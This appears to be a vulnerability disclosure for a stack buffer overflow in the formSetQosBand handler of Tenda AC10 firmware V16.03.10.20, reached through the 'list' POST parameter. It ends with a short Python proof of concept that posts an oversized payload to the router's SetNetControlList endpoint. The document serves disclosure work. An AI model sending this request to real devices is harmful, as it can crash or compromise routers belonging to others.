## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3684.html

## Affected version

V16.03.10.20

## Vulnerability details

The Tenda AC10 V16.03.10.20 firmware has a stack overflow vulnerability in the `formSetQosBand` function. The `s` variable receives the `list` parameter from a POST request and this variable is passed into function `set_qosMib_list` as `a1`. In function `set_qosMib_list`, variable `a1` is passed to `s`, which is later assigned to the `v9` variable, which is fixed at 256 bytes. However, since the user can control the input of `list`, the statement `strcpy(v9, s);` can cause a buffer overflow. The user-provided `list` can exceed the capacity of the `v9` array, triggering this security vulnerability.

![image-20240309101244915](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309101244915.png)

![image-20240309101253491](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309101253491.png)

![image-20240309101316064](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309101316064.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetNetControlList"
payload = b"a"*2000

data = {"list": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240309101433537](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309101433537.png)
